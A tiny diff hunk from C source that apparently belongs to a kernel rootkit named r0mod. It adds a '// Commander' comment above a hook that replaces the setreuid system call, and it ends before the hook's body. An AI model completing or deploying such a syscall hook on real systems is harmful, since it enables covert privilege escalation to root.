@@ -2,6 +2,7 @@
 
 #include <r0mod/global.h>
 
+// Commander
 asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
 {
